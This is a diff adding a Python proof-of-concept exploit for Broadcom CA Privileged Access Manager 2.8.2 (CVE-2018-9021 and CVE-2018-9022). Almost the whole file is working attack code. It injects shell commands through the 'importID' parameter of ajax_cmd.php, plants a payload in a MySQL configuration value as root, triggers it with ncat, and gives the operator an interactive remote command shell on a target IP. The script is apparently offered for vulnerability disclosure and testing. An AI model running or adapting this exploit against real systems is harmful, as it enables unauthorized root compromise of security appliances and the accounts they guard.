@@ -1,0 +1,71 @@
+# Title: Broadcom CA Privilged Access Manager 2.8.2 - Remote Command Execution
+# Author: Peter Lapp
+# Date: 2019-12-05
+# Vendor: https://techdocs.broadcom.com/us/product-content/recommended-reading/security-notices/ca20180614-01--security-notice-for-ca-privileged-access-manager.html
+# CVE: CVE-2018-9021 and CVE-2018-9022
+# Tested on: v2.8.2
+
+import urllib2
+import urllib
+import ssl
+import sys
+import json
+import base64
+
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+
+def send_command(ip, cmd):
+    cmd = urllib.quote_plus(cmd)
+    url = 'https://'+ip+'/ajax_cmd.php?cmd=AD_IMPORT&command=add&groupId=123&importID=|'+cmd+'+2>%261||&deviceMode=test'
+    request = urllib2.Request(url, None)
+    response = urllib2.urlopen(request, context=ctx)
+    result = json.load(response)
+    return result['responseData']
+
+def get_db_value():
+    cmd = "echo select value from configuration_f where name = 'ssl_vpn_network' | mysql -u root uag"
+    db_value = send_command(ip,cmd)
+    db_value = db_value.split('\n')[1]
+    return db_value
+    
+def encode_payload(cmd):
+    sql_string = "update configuration_f set value='\\';"+cmd+" > /tmp/output;\\'' where name='ssl_vpn_network'"
+    cmd = "echo "+base64.b64encode(sql_string)+" | base64 -d | mysql -u root uag "
+    return cmd
+    
+def restore_sql(value):
+    sql_string = "update configuration_f set value='"+value+"' where name='ssl_vpn_network'"
+    cmd = "echo "+base64.b64encode(sql_string)+" | base64 -d | mysql -u root uag "
+    send_command(ip,cmd)
+    
+def main():
+    print '''Xceedium Command Execution PoC by Peter Lapp(lappsec)'''
+	
+    if len(sys.argv) != 2:
+        print "Usage: xceedium_rce.py <target ip>"
+        sys.exit()
+
+    global ip
+    ip = sys.argv[1]
+    print 'Enter commands below. Type exit to quit'
+	
+    while True:
+        cmd = raw_input('# ')
+        if cmd == "exit":
+            sys.exit()
+        orig_value = get_db_value()
+        payload = encode_payload(cmd)
+        send_command(ip, payload)
+        send_command(ip, 'echo -e openvpn\\n | ncat --send-only 127.0.0.1 2210')
+        output = send_command(ip, 'cat /tmp/output')
+        print output
+        restore_sql(orig_value)
+	
+
+
+if __name__ == "__main__":
+    main()
